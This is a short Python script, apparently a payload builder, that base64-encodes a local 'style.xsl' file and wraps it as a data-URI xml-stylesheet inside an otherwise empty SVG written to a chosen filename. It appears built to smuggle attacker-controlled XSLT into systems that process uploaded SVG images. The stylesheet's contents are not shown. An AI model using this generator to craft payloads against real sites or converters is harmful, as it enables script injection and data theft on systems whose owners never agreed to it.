import base64
import sys

if (len(sys.argv)<2):
    exit("Usage: python enc.py <filename>")

with open("style.xsl", "rb") as f:
    encoded_string = base64.b64encode(f.read())
    payload="""<?xml version="1.0" ?>
<?xml-stylesheet href="data:text/xsl;base64,{}" type="text/xsl" ?>
<svg width="10cm" height="5cm"
     xmlns="http://www.w3.org/2000/svg">
</svg>""".format(encoded_string.decode("utf-8") )
    f = open(sys.argv[1], "w")
    f.write(payload)
    f.close()